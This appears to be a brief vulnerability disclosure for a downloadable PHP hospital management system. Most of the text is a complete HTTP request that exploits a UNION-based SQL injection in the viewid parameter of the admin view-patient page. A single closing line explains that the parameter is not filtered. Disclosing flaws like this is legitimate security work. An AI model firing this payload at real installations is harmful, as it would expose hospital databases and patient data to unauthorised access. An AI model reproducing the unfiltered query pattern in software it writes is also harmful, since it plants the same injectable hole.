You can go to https://phpgurukul.com/hospital-management-system-in-php/ download this website 

## EXP:

```php
GET /hms/admin/view-patient.php?viewid=-1%27%20+UNION+ALL+SELECT+1,2,user(),4,5,6,7,8,9,10,11%20--%20+ HTTP/1.1
Host: 192.168.1.129
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=3dvh0itqcaqq5rmkh3cs78t7n7
Connection: close
```

Since the ID parameter is not filtered with special characters on this page, malicious SQL statements can be executed to obtain more data
